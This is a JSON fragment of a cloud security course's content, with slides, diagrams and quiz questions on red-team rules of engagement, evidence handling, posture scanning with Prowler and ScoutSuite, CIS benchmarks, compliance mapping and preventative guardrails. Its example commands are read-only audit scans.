+              "question": "Mid-engagement, a tool reveals an attack path that leads into a third-party vendor's SaaS account not listed in scope. Per ROE, you should:",
+              "options": [
+                "Exploit it quickly to maximise impact before anyone notices",
+                "Stop at the boundary, document the path as a finding, and do not cross into the out-of-scope third party",
+                "Email the vendor and ask them to grant you access",
+                "Delete the path so no real attacker can use it"
+              ],
+              "correctIndex": 1,
+              "explanation": "Authorisation covers only in-scope assets. A path into an out-of-scope third party is reported as a finding (it is valuable: it shows blast radius) but not traversed. Crossing it would be unauthorised access to someone else's system, a legal and ethical violation, regardless of how exploitable it looks."
+            }
+          },
+          {
+            "title": "OPSEC Under Detection",
+            "body": "OPSEC (operational security) is how you operate to meet the engagement's goals, sometimes stealthily, sometimes loudly, as the ROE directs.\n\n- If the goal is to test detection, you may deliberately stay under GuardDuty thresholds, use low-and-slow exfil, and avoid obvious indicators, but only where the ROE permits that stealth.\n- If the goal is to test response, you may operate openly so the blue team gets practice.\n- Either way you log your own actions meticulously (timestamps, source IPs, commands) so every alert can be attributed to you during deconfliction, and so nothing you did gets confused with a real intrusion.\n\nStealth is a tool, not a licence: you never exceed scope to stay hidden, and you never disable the client's real defences beyond what the ROE explicitly allows.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Define goal",
+                  "detail": "test detection or response?"
+                },
+                {
+                  "label": "Set OPSEC level",
+                  "detail": "stealthy vs overt per ROE"
+                },
+                {
+                  "label": "Log everything",
+                  "detail": "attributable actions"
+                },
+                {
+                  "label": "Deconflict",
+                  "detail": "separate test from real IR"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Evidence Handling and Protecting Real Data",
+            "body": "You will encounter real sensitive data. The professional rule is to prove impact without hoarding it.\n\n- Demonstrate access with the minimum evidence: a redacted record count, a hash, a single masked sample, a screenshot of a bucket listing, not a full copy of the customer database.\n- Never exfiltrate real user data beyond genuine PoC need; store any evidence encrypted, access-controlled, and delete it after the report is accepted.\n- Treat secrets you find as toxic: record that you could read them, rotate-recommend them, do not reuse them beyond the engagement.\n\nThis mirrors bug-bounty safe-harbour discipline from earlier modules: the goal is to show the risk, not to become the breach you are simulating.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "Reckless",
+                  "points": [
+                    "Download full customer DB",
+                    "Keep copies after engagement",
+                    "Reuse found secrets",
+                    "Unencrypted loot on laptop"
+                  ]
+                },
+                {
+                  "label": "Professional",
+                  "points": [
+                    "Masked sample + record count",
+                    "Encrypted, access-controlled evidence",
+                    "Prove access, don't hoard",
+                    "Secure deletion after sign-off"
+                  ],
+                  "highlighted": true
+                }
+              ]
+            }
+          },
+          {
+            "title": "Reporting and Purple-Teaming",
+            "body": "The deliverable is the value. A strong cloud red-team report has:\n- An attack narrative: the end-to-end story from initial access to objective, told as a chain the reader can follow.\n- Evidence per step: exact commands, API calls, screenshots, timestamps, reproducible.\n- Business impact: what the reached data/actions mean in real terms (breach, fraud, downtime), not just 'misconfigured IAM'.\n- Prioritised remediation: tied to choke-point edges, highest path-reduction first.\n\nPurple-teaming closes the loop: you sit with the blue team and replay each stage so they can confirm which detections fired, tune the ones that missed, and build new ones. A red-team that improves the defenders' detection coverage, not just lists holes, is the one that gets hired again.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Narrative",
+                  "detail": "initial access -> objective"
+                },
+                {
+                  "label": "Evidence",
+                  "detail": "commands, timestamps, screenshots"
+                },
+                {
+                  "label": "Impact + fixes",
+                  "detail": "business risk, choke-point cuts"
+                },
+                {
+                  "label": "Purple replay",
+                  "detail": "validate & tune detections"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Why It Matters, Ethics Front and Centre",
+            "body": "Every technique in this module is dual-use. The line between a respected cloud red-teamer and a criminal is not skill, it is authorisation, scope discipline, data care and honest reporting.\n\nThe engagement wrapper is what lets organizations safely learn how they would really be attacked, so they can fix it before a genuine adversary does. Breaking the wrapper, going out of scope, hoarding data, hiding actions, destroys trust, exposes you to legal liability, and can cause the very harm you were hired to prevent.\n\nCarry this discipline into every lab and every real engagement: only test what you are authorised to test, take only the evidence you need, log everything, and hand back a report that makes the defenders stronger. That is the profession."
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "cloud-m12",
+    "name": "CSPM, Compliance & Hardening at Scale",
+    "shortName": "CSPM & Hardening",
+    "month": 4,
+    "weeks": [
+      4
+    ],
+    "description": "Moves from one-off findings to continuous, estate-wide posture management. Students learn CSPM tooling, CIS benchmarks and compliance frameworks, policy-as-code guardrails, and secure-by-default landing zones that prevent misconfiguration rather than chasing it.",
+    "estimatedHours": 10,
+    "outcomes": [
+      "Run and interpret CSPM tooling (Prowler, ScoutSuite, Security Hub, Cloud Custodian) across an estate",
+      "Apply CIS Benchmarks and map controls to compliance frameworks (CIS, NIST, PCI, SOC 2)",
+      "Implement preventative guardrails with SCPs and policy-as-code (OPA, Cloud Custodian)",
+      "Design a secure-by-default landing zone that makes misconfiguration hard"
+    ],
+    "topics": [
+      {
+        "id": "cloud-m12-1",
+        "moduleId": "cloud-m12",
+        "number": 72,
+        "title": "Cloud Security Posture Management",
+        "type": "lab",
+        "week": 4,
+        "description": "Continuous scanning of configuration against best practice. Students run the standard open-source and native CSPM tools and triage the output.",
+        "keyPoints": [
+          "Prowler and ScoutSuite for multi-service, multi-account posture scans",
+          "AWS Security Hub standards and Config rules as native CSPM",
+          "Prioritising findings by exploitability, not raw count",
+          "Multi-account scanning via Organizations and delegated admin",
+          "Commercial CNAPP context (Wiz, Prisma Cloud) and what they add"
+        ],
+        "slides": [
+          {
+            "title": "What CSPM Is",
+            "body": "Cloud Security Posture Management (CSPM) is continuous, automated checking of your cloud configuration against a set of best-practice rules. 'Posture' just means the current state of all your settings: which S3 buckets are public, whether logging is on, which security groups are wide open.\n\nAnalogy: a building inspector who walks every room of every floor, every night, with a checklist, and hands you a report of what is unsafe. You are not fixing one broken window you happened to see; you are scanning the whole estate on a schedule. CSPM turns 'I hope nothing is misconfigured' into a repeatable, evidence-backed scan.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "Without CSPM",
+                  "points": [
+                    "Find misconfig by luck or after a breach",
+                    "No estate-wide view",
+                    "Manual console clicking",
+                    "Drift goes unnoticed"
+                  ]
+                },
+                {
+                  "label": "With CSPM",
+                  "points": [
+                    "Scheduled scan of every account",
+                    "Scored against a benchmark",
+                    "Machine-readable findings",
+                    "Drift caught the next run"
+                  ],
+                  "highlighted": true
+                }
+              ]
+            }
+          },
+          {
+            "title": "How a CSPM Scan Works",
+            "body": "A CSPM tool does not touch your running workloads. It authenticates with read-only API permissions and calls the provider's control-plane APIs (DescribeSecurityGroups, GetBucketAcl, GetAccountPasswordPolicy, and hundreds more). It pulls the current configuration, then evaluates each resource against a rule set.\n\nEach rule is a small check: 'Is this trail multi-region?', 'Does this bucket allow public read?'. The output is a list of PASS/FAIL findings with the resource ARN, the rule, a severity, and often a remediation hint. Because it is API-driven and read-only, it is safe to run against production.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Read-only creds",
+                  "detail": "SecurityAudit / ViewOnly role"
+                },
+                {
+                  "label": "Call config APIs",
+                  "detail": "Describe/Get/List across services"
+                },
+                {
+                  "label": "Evaluate rules",
+                  "detail": "Each resource vs each check"
+                },
+                {
+                  "label": "Score + report",
+                  "detail": "PASS/FAIL, severity, resource ARN"
+                }
+              ]
+            },
+            "check": {
+              "question": "Why is a CSPM scan generally safe to run against a production account?",
+              "options": [
+                "It pauses all workloads before scanning",
+                "It only needs read-only control-plane permissions and does not modify resources",
+                "It runs inside each EC2 instance as root",
+                "It encrypts the account during the scan"
+              ],
+              "correctIndex": 1,
+              "explanation": "CSPM reads configuration through Describe/Get/List APIs with an audit (read-only) role. It inspects settings, it does not change resources, so it will not disrupt running workloads."
+            }
+          },
+          {
+            "title": "Worked Example: Prowler",
+            "body": "Prowler is the most widely used open-source CSPM for AWS (it also supports Azure, GCP and Kubernetes). You give it an audit profile and it runs hundreds of checks. Here it scans a sandbox account and flags a public S3 bucket and a wide-open security group. The check IDs (like s3_bucket_public_access) map to CIS and other frameworks, so a finding is already audit-ready.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "prowler aws --profile technieum -M csv json-ocsf",
+                  "output": "Scanning account 767196576843 (ap-south-1)..."
+                },
+                {
+                  "command": "",
+                  "output": "FAIL s3_bucket_public_access  bucket: reports-prod  (Public READ via ACL)  [HIGH]"
+                },
+                {
+                  "command": "",
+                  "output": "FAIL ec2_securitygroup_in_allow_0.0.0.0/0  sg-0a1b (port 22 open)  [HIGH]"
+                },
+                {
+                  "command": "",
+                  "output": "PASS cloudtrail_multi_region_enabled  trail: org-trail"
+                },
+                {
+                  "command": "",
+                  "output": "Results: 312 PASS  47 FAIL  -> output/prowler-output.csv"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Variant: ScoutSuite and Native CSPM",
+            "body": "Different tools, same idea, different strengths.\n\nProwler: CLI, per-check output, great for pipelines and CSV/JSON evidence.\n\nScoutSuite (NCC Group): produces a single browsable HTML dashboard of the whole account, strong for a first visual sweep across AWS/Azure/GCP.\n\nAWS Security Hub + Config: the native, always-on option. Config continuously records resource state and evaluates rules; Security Hub aggregates those plus the CIS/AWS Foundational standards into one console, across accounts, with no server to run.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "Prowler",
+                  "points": [
+                    "Open source CLI",
+                    "Per-check CSV/JSON",
+                    "Easy to automate in CI"
+                  ]
+                },
+                {
+                  "label": "ScoutSuite",
+                  "points": [
+                    "Open source",
+                    "HTML dashboard",
+                    "Good first visual pass"
+                  ]
+                },
+                {
+                  "label": "Security Hub + Config",
+                  "points": [
+                    "AWS-native, always on",
+                    "Continuous, not snapshot",
+                    "Org-wide aggregation"
+                  ],
+                  "highlighted": true
+                }
+              ]
+            }
+          },
+          {
+            "title": "Triage: Prioritise by Exploitability, Not Count",
+            "body": "A fresh scan of a messy account easily returns thousands of findings. Fixing them top-to-bottom by raw count is how teams burn out and still get breached.\n\nRank by exploitability and blast radius instead. A public S3 bucket holding customer PII and an admin role reachable from the internet outrank 400 'bucket missing a tag' findings. Ask three questions per finding: Can an attacker reach it? What do they gain? How far does it spread? The handful that answer 'internet / admin / whole account' are your real work.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "All findings",
+                  "detail": "e.g. 3000 raw results"
+                },
+                {
+                  "label": "Reachable?",
+                  "detail": "Internet-exposed or attacker-controllable"
+                },
+                {
+                  "label": "Impact?",
+                  "detail": "Sensitive data or privilege gained"
+                },
+                {
+                  "label": "Blast radius?",
+                  "detail": "One resource vs whole account/org"
+                },
+                {
+                  "label": "Fix list",
+                  "detail": "Top ~20 real risks first"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Scanning the Whole Estate",
+            "body": "Real environments are dozens or hundreds of accounts. Scanning one at a time does not scale. AWS Organizations plus delegated admin lets a central security account assume a read-only role into every member account and scan them in one pass.\n\nPattern: a standard cross-account role (e.g. ProwlerScanRole with the SecurityAudit policy) is deployed to every account via the Organization. The security account assumes it account by account. Security Hub does the native version of this automatically for all member accounts once you enable it org-wide.",
+            "diagram": {
+              "type": "graph-tree",
+              "nodes": [
+                {
+                  "id": "sec",
+                  "label": "Security account (delegated admin)",
+                  "highlighted": true
+                },
+                {
+                  "id": "a1",
+                  "label": "Prod account"
+                },
+                {
+                  "id": "a2",
+                  "label": "Dev account"
+                },
+                {
+                  "id": "a3",
+                  "label": "Sandbox account"
+                }
+              ],
+              "edges": [
+                {
+                  "from": "sec",
+                  "to": "a1",
+                  "label": "assume audit role"
+                },
+                {
+                  "from": "sec",
+                  "to": "a2",
+                  "label": "assume audit role"
+                },
+                {
+                  "from": "sec",
+                  "to": "a3",
+                  "label": "assume audit role"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Do It: Run the Posture Scan Lab",
+            "body": "In the module lab 'Full Posture Scan' you run Prowler and ScoutSuite against a deliberately messy AWS sandbox, then triage the output into a prioritised remediation plan.\n\nSteps: 1) configure a read-only profile; 2) run `prowler aws --profile <p> -M csv json-ocsf`; 3) run ScoutSuite for the visual dashboard; 4) export the FAIL findings; 5) rank them by exploitability (internet-reachable + sensitive + wide blast radius first); 6) write a short plan listing the top findings, why each matters, and the fix. The deliverable is the prioritised plan, not the raw dump.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "scout aws --profile technieum",
+                  "output": "Running... report saved to scoutsuite-report/aws-technieum.html"
+                },
+                {
+                  "command": "python3 triage.py prowler-output.csv --only FAIL --sort severity",
+                  "output": "Top risks: 2 public buckets, 1 admin SG open to 0.0.0.0/0, 1 user without MFA"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Commercial CNAPP and Why It Matters",
+            "body": "Commercial CNAPP platforms (Wiz, Prisma Cloud, Microsoft Defender for Cloud) build on CSPM but add context: they correlate a misconfiguration with a known vulnerability, a reachable path, and sensitive data to surface 'toxic combinations' as a single prioritised attack path, across clouds, in one place.\n\nWhy it matters: posture is not a one-time project. New accounts, new services and daily changes constantly reintroduce risk. CSPM is the sensor layer of a continuous program; without it you are blind to drift and only learn about misconfigurations from attackers.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "Plain CSPM",
+                  "points": [
+                    "Lists misconfigurations",
+                    "Per-resource findings",
+                    "You correlate manually"
+                  ]
+                },
+                {
+                  "label": "CNAPP",
+                  "points": [
+                    "Correlates misconfig + CVE + exposure + data",
+                    "Surfaces attack paths",
+                    "Cross-cloud single view"
+                  ],
+                  "highlighted": true
+                }
+              ]
+            }
+          }
+        ]
+      },
+      {
+        "id": "cloud-m12-2",
+        "moduleId": "cloud-m12",
+        "number": 73,
+        "title": "CIS Benchmarks & Config Baselines",
+        "type": "theory",
+        "week": 4,
+        "description": "The canonical hardening checklist. Students learn the CIS AWS Foundations Benchmark controls and how to measure and enforce them.",
+        "keyPoints": [
+          "CIS AWS Foundations Benchmark structure (IAM, logging, monitoring, networking)",
+          "Key controls: root MFA, CloudTrail on all regions, no 0.0.0.0/0 on admin ports",
+          "AWS Config conformance packs to continuously check benchmark compliance",
+          "Remediation vs exception handling and documented risk acceptance",
+          "Benchmark drift detection over time"
+        ],
+        "slides": [
+          {
+            "title": "What a CIS Benchmark Is",
+            "body": "A CIS Benchmark is a consensus-built checklist of specific, hardening settings for a technology, published by the Center for Internet Security. The CIS AWS Foundations Benchmark is the canonical one for AWS: dozens of numbered controls like 'Ensure MFA is enabled for the root account'.\n\nAnalogy: a recipe card for a secure configuration. Instead of arguing about what 'secure' means, everyone cooks from the same card. Each control states exactly what to check, why it matters, and how to fix it, so audits and tools agree on a single definition of done.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "Vague 'be secure'",
+                  "points": [
+                    "Subjective",
+                    "Unmeasurable",
+                    "Everyone disagrees",
+                    "No audit trail"
+                  ]
+                },
+                {
+                  "label": "CIS Benchmark",
+                  "points": [
+                    "Numbered, specific controls",
+                    "Pass/fail measurable",
+                    "Industry consensus",
+                    "Maps to audits"
+                  ],
+                  "highlighted": true
+                }
+              ]
+            }
+          },
+          {
+            "title": "How the Benchmark Is Structured",
+            "body": "The CIS AWS Foundations Benchmark groups controls into sections: Identity and Access Management, Logging, Monitoring, and Networking. Each control has a level: Level 1 is baseline hardening everyone should do; Level 2 is stricter, for high-security environments where some usability trade-off is acceptable.\n\nEvery control is written as 'Ensure X', with an audit procedure (how to check) and a remediation (how to fix). This structure is what lets a scanner like Prowler map each of its checks directly to a benchmark control number.",
+            "diagram": {
+              "type": "graph-tree",
+              "nodes": [
+                {
+                  "id": "b",
+                  "label": "CIS AWS Foundations Benchmark",
+                  "highlighted": true
+                },
+                {
+                  "id": "iam",
+                  "label": "1. IAM"
+                },
+                {
+                  "id": "log",
+                  "label": "3. Logging"
+                },
+                {
+                  "id": "mon",
+                  "label": "4. Monitoring"
+                },
+                {
+                  "id": "net",
+                  "label": "5. Networking"
+                }
+              ],
+              "edges": [
+                {
+                  "from": "b",
+                  "to": "iam",
+                  "label": "root MFA, key rotation"
+                },
+                {
+                  "from": "b",
+                  "to": "log",
+                  "label": "CloudTrail all regions"
+                },
+                {
+                  "from": "b",
+                  "to": "mon",
+                  "label": "alarms on changes"
+                },
+                {
+                  "from": "b",
+                  "to": "net",
+                  "label": "no 0.0.0.0/0 on admin"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Worked Example: Three Key Controls",
+            "body": "Three controls you will check on almost every engagement:\n\nRoot MFA (IAM): the root user must have multi-factor auth, because root cannot be restricted by IAM policy.\n\nCloudTrail multi-region (Logging): a trail must be enabled in all regions, or an attacker simply operates in an unlogged region.\n\nNo 0.0.0.0/0 on admin ports (Networking): security groups must not expose SSH (22) or RDP (3389) to the whole internet. Here the CLI proves the networking control is failing.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "aws ec2 describe-security-groups --profile technieum --query \"SecurityGroups[].IpPermissions[?ToPort==\\`22\\`]\"",
+                  "output": "[ { \"ToPort\": 22, \"IpRanges\": [ { \"CidrIp\": \"0.0.0.0/0\" } ] } ]"
+                },
+                {
+                  "command": "",
+                  "output": "CIS 5.2 FAIL: SSH (22) open to 0.0.0.0/0 on sg-0a1b"
+                },
+                {
+                  "command": "aws iam get-account-summary --profile technieum --query 'SummaryMap.AccountMFAEnabled'",
+                  "output": "0"
+                },
+                {
+                  "command": "",
+                  "output": "CIS 1.5 FAIL: root account MFA not enabled"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Enforcing It: Config Conformance Packs",
+            "body": "Checking the benchmark once is useful; checking it continuously is the goal. AWS Config conformance packs are a bundle of Config rules packaged to match a benchmark (there is an 'Operational Best Practices for CIS AWS Foundations' pack).\n\nYou deploy the pack once; Config then continuously evaluates every covered resource and marks it COMPLIANT or NON_COMPLIANT as things change. The moment someone opens a security group to the world, the relevant rule flips to non-compliant. This turns a point-in-time checklist into a live compliance signal.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Deploy conformance pack",
+                  "detail": "CIS best-practices bundle"
+                },
+                {
+                  "label": "Config records state",
+                  "detail": "Every resource change tracked"
+                },
+                {
+                  "label": "Rules evaluate",
+                  "detail": "COMPLIANT / NON_COMPLIANT"
+                },
+                {
+                  "label": "Dashboard + alerts",
+                  "detail": "Live compliance score"
+                }
+              ]
+            },
+            "check": {
+              "question": "What does an AWS Config conformance pack give you that a one-off benchmark scan does not?",
+              "options": [
+                "It automatically fixes every finding without approval",
+                "Continuous, ongoing evaluation that flips to non-compliant as soon as a resource drifts",
+                "A guarantee that no misconfiguration can ever occur",
+                "A legally binding compliance certificate"
+              ],
+              "correctIndex": 1,
+              "explanation": "A conformance pack is a bundle of Config rules that evaluate resources continuously. Unlike a snapshot scan, it reflects changes in near-real-time, flipping resources to NON_COMPLIANT when they drift from the benchmark."
+            }
+          },
+          {
+            "title": "Remediation vs Documented Exceptions",
+            "body": "Not every failing control can or should be 'fixed'. Sometimes a control genuinely does not apply, or the business accepts the risk for a reason (a legacy system that cannot support a setting).\n\nThe mature answer is not to silently ignore it. It is a documented exception: a risk acceptance recorded with the control number, the reason, the compensating controls, an owner, and a review date. This keeps the audit honest. 'We fail CIS 2.1.2 because X, accepted by Y until Z' is defensible; an unexplained failing control is not.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "Remediate",
+                  "points": [
+                    "Default choice",
+                    "Change config to pass",
+                    "Automate where possible"
+                  ],
+                  "highlighted": true
+                },
+                {
+                  "label": "Documented exception",
+                  "points": [
+                    "When fix is infeasible",
+                    "Record reason + owner + review date",
+                    "Note compensating controls"
+                  ]
+                }
+              ]
+            }
+          },
+          {
+            "title": "Detecting Benchmark Drift Over Time",
+            "body": "A perfect score on Monday means nothing if the estate drifts by Friday. Drift is the slow slide back to insecure as people make changes: someone reopens a port for 'quick testing', a new bucket ships public, key rotation lapses.\n\nTracking the compliance score over time turns drift into a visible trend. A dashboard that shows the CIS score dropping from 94% to 81% over two weeks tells you changes are outrunning your guardrails, and points you at exactly which controls regressed and when.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Baseline",
+                  "detail": "94% compliant, recorded"
+                },
+                {
+                  "label": "Changes land",
+                  "detail": "New ports, buckets, roles"
+                },
+                {
+                  "label": "Config re-evaluates",
+                  "detail": "Some controls regress"
+                },
+                {
+                  "label": "Drift alert",
+                  "detail": "Score drops -> investigate"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Why It Matters",
+            "body": "CIS Benchmarks give you three things at once. A shared definition of secure so tools, auditors and engineers stop arguing. A measurable score so you can prove improvement and spot drift. And a bridge to compliance, because many frameworks (PCI, SOC 2) accept benchmark alignment as evidence.\n\nIn practice the benchmark is the backbone of a CSPM program: Prowler checks map to it, Config conformance packs enforce it, and the compliance score is the single number leadership tracks. Master the benchmark and the rest of posture management has a clear target.",
+            "diagram": {
+              "type": "graph-tree",
+              "nodes": [
+                {
+                  "id": "cis",
+                  "label": "CIS Benchmark control",
+                  "highlighted": true
+                },
+                {
+                  "id": "prowler",
+                  "label": "Prowler check"
+                },
+                {
+                  "id": "config",
+                  "label": "Config conformance pack"
+                },
+                {
+                  "id": "audit",
+                  "label": "PCI / SOC 2 evidence"
+                }
+              ],
+              "edges": [
+                {
+                  "from": "cis",
+                  "to": "prowler",
+                  "label": "detect"
+                },
+                {
+                  "from": "cis",
+                  "to": "config",
+                  "label": "enforce"
+                },
+                {
+                  "from": "cis",
+                  "to": "audit",
+                  "label": "map"
+                }
+              ]
+            }
+          }
+        ]
+      },
+      {
+        "id": "cloud-m12-3",
+        "moduleId": "cloud-m12",
+        "number": 74,
+        "title": "Compliance Frameworks",
+        "type": "theory",
+        "week": 4,
+        "description": "Translating security controls into audit language. Students map technical controls to the frameworks customers are assessed against.",
+        "keyPoints": [
+          "NIST CSF / 800-53, PCI-DSS, SOC 2, ISO 27001, HIPAA at a control level",
+          "AWS Audit Manager and Config for evidence collection",
+          "Shared-responsibility in compliance: provider attestations vs customer controls",
+          "Mapping one control to many frameworks to avoid duplicate work",
+          "Continuous compliance vs point-in-time audit"
+        ],
+        "slides": [
+          {
+            "title": "What Compliance Frameworks Are",
+            "body": "A compliance framework is a structured list of security and governance requirements that an organization is measured against, usually by an auditor. Examples: NIST CSF and 800-53, PCI-DSS (card data), SOC 2 (service providers), ISO 27001 (information security management), HIPAA (US health data).\n\nAnalogy: a restaurant health inspection. The inspector does not care how you run your kitchen as long as you meet the written standard and can prove it. Frameworks are the written standard; an audit is the inspection; your evidence is what proves you comply.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "Technical control",
+                  "points": [
+                    "CloudTrail enabled",
+                    "MFA on root",
+                    "Encryption at rest"
+                  ]
+                },
+                {
+                  "label": "Framework requirement",
+                  "points": [
+                    "'Log and monitor access'",
+                    "'Protect privileged accounts'",
+                    "'Protect data at rest'"
+                  ],
+                  "highlighted": true
+                }
+              ]
+            }
+          },
+          {
+            "title": "How Controls Map to Frameworks",
+            "body": "Frameworks are written in audit language, not AWS terms. A requirement like PCI-DSS 10 ('Track and monitor all access to network resources and cardholder data') does not mention CloudTrail. Your job is to map the abstract requirement to the concrete technical control that satisfies it.\n\nThe mechanism: for each framework requirement, identify the cloud control(s) that implement it, and the evidence that proves it is in place. 'CloudTrail is on in all regions, here is the Config compliance report' is the translation from engineering reality into auditor language.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Framework requirement",
+                  "detail": "e.g. PCI-DSS 10: log all access"
+                },
+                {
+                  "label": "Technical control",
+                  "detail": "CloudTrail multi-region + log integrity"
+                },
+                {
+                  "label": "Implementation",
+                  "detail": "Config rule enforces it"
+                },
+                {
+                  "label": "Evidence",
+                  "detail": "Compliance report / Audit Manager"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Worked Example: One Control, Many Frameworks",
+            "body": "Encryption at rest for stored data is a single technical control. Turn it on once (S3 default encryption, EBS encryption, RDS encryption) and it satisfies a requirement in almost every framework at the same time.\n\nThis is the core efficiency move: you implement the control once, then reference it as evidence against each framework's matching clause. The table below shows one AWS control answering four different auditors.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "Control: Encrypt data at rest",
+                  "points": [
+                    "PCI-DSS Req 3 (protect stored data)",
+                    "SOC 2 CC6.1 (logical access/encryption)",
+                    "NIST 800-53 SC-28 (protection at rest)",
+                    "ISO 27001 A.8.24 (cryptography)"
+                  ],
+                  "highlighted": true
+                }
+              ]
+            }
+          },
+          {
+            "title": "Collecting Evidence Automatically",
+            "body": "Auditors want proof, not promises. Manually screenshotting console settings for hundreds of controls is slow and stale the moment it is taken.\n\nAWS Audit Manager automates this: it continuously collects evidence from Config, CloudTrail, Security Hub and other sources, and organizes it against a framework you choose (it ships prebuilt frameworks for PCI, SOC 2, CIS and more). Config supplies the continuous compliance data underneath. The result is an always-current evidence package instead of a last-minute scramble.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Select framework",
+                  "detail": "e.g. PCI-DSS in Audit Manager"
+                },
+                {
+                  "label": "Auto-collect evidence",
+                  "detail": "From Config, CloudTrail, Security Hub"
+                },
+                {
+                  "label": "Map to controls",
+                  "detail": "Evidence grouped per requirement"
+                },
+                {
+                  "label": "Assessment report",
+                  "detail": "Shareable with auditor"
+                }
+              ]
+            },
+            "check": {
+              "question": "What is the main advantage of AWS Audit Manager over manual evidence collection?",
+              "options": [
+                "It writes the audit report's conclusions for the auditor",
+                "It continuously and automatically gathers evidence from sources like Config and CloudTrail, mapped to framework controls",
+                "It makes compliance legally optional",
+                "It encrypts all data by default"
+              ],
+              "correctIndex": 1,
+              "explanation": "Audit Manager automates evidence collection, pulling current data from Config, CloudTrail, Security Hub and others and organizing it against a chosen framework. This replaces slow, stale manual screenshots with a continuously updated evidence package."
+            }
+          },
+          {
+            "title": "Shared Responsibility in Compliance",
+            "body": "In the cloud, compliance is split. The provider is responsible for the security OF the cloud (physical data centers, hypervisor, hardware) and hands you attestations, AWS's own SOC 2 / PCI / ISO reports via AWS Artifact. You are responsible for security IN the cloud (your IAM, your encryption, your network).\n\nA common trap: 'we are on AWS so we are PCI compliant'. False. AWS's attestation covers the infrastructure layer only. Your configuration still has to meet the customer-responsibility controls, and that is what your auditor assesses.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "Provider (OF the cloud)",
+                  "points": [
+                    "Data centers, hardware",
+                    "Hypervisor, managed-service internals",
+                    "Supplies attestations via Artifact"
+                  ]
+                },
+                {
+                  "label": "Customer (IN the cloud)",
+                  "points": [
+                    "IAM, MFA, least privilege",
+                    "Encryption, key management",
+                    "Network config, logging"
+                  ],
+                  "highlighted": true
+                }
+              ]
+            }
+          },
+          {
+            "title": "Do It and Why It Matters",
+            "body": "Practical step: take one control you already enforce (CloudTrail multi-region) and map it across frameworks. In Audit Manager, add the CIS or PCI framework, confirm the trail evidence lands under the logging requirement, and note which other frameworks the same control answers.\n\nWhy it matters: compliance is often the budget and the gate for security work, no SOC 2 report means no enterprise customers. Mapping one control to many frameworks avoids duplicate effort, and continuous compliance (via Config and Audit Manager) replaces the painful point-in-time audit scramble with an always-ready posture.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "Point-in-time audit",
+                  "points": [
+                    "Scramble before the deadline",
+                    "Evidence stale immediately after",
+                    "Gaps hidden between audits"
+                  ]
+                },
+                {
+                  "label": "Continuous compliance",
+                  "points": [
+                    "Evidence always current",
+                    "Drift caught early",
+                    "Audit is a report, not a project"
+                  ],
+                  "highlighted": true
+                }
+              ]
+            }
+          }
+        ]
+      },
+      {
+        "id": "cloud-m12-4",
+        "moduleId": "cloud-m12",
+        "number": 75,
+        "title": "Preventative Guardrails",
+        "type": "lab",
+        "week": 4,
+        "description": "Stopping misconfiguration before it exists. SCPs and policy-as-code block bad states rather than detecting them after the fact.",
+        "keyPoints": [
+          "SCPs: deny public S3, deny disabling CloudTrail, restrict regions, require encryption",
+          "Cloud Custodian policies for automated remediation and enforcement",
+          "OPA/Conftest and Checkov scanning Terraform/CloudFormation pre-deploy",
+          "Service Control Policies vs permission boundaries vs Config rules",
+          "Shift-left: catching misconfig in CI before it reaches the cloud"
+        ],
+        "slides": [
+          {
+            "title": "What Preventative Guardrails Are",
+            "body": "A guardrail stops a bad configuration from ever existing, instead of detecting it after the fact. Detective controls (CSPM, Config) find the public bucket after it is created; preventative controls refuse to create it in the first place.\n\nAnalogy: a detective control is a smoke alarm, it tells you after the fire starts. A preventative guardrail is a building code that bans flammable wiring, so the fire can't start. Both matter, but prevention scales: one guardrail silently blocks the mistake for every team, forever, with no triage.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "Detective",
+                  "points": [
+                    "Finds misconfig after creation",
+                    "Requires triage + remediation",
+                    "Window of exposure exists"
+                  ]
+                },
+                {
+                  "label": "Preventative",
+                  "points": [
+                    "Blocks bad state up front",
+                    "No exposure window",
+                    "Scales with zero triage"
+                  ],
+                  "highlighted": true
+                }
+              ]
+            }
+          },
+          {
+            "title": "How SCPs Work",
